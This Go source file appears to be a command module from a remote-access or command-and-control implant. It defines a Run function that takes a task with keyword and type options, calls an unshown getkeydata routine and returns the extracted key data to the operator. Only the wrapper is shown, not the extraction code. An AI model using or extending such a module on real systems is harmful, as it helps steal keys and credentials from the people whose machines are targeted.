package keys

import (
	"encoding/json"

	"pkg/utils/structs"
)

//KeyInformation - interface for key data
type KeyInformation interface {
	KeyType() string
	Data() []byte
}

//Options - options for key data command
type Options struct {
	Command  string `json:"command"`
	Keyword  string `json:"keyword"`
	Typename string `json:"typename"`
}

//Run - extract key data
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	//Check if the types are available
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task
	opts := Options{}
	err := json.Unmarshal([]byte(task.Params), &opts)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	res, err := getkeydata(opts)
	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = res.Data()
	threadChannel <- tMsg
}
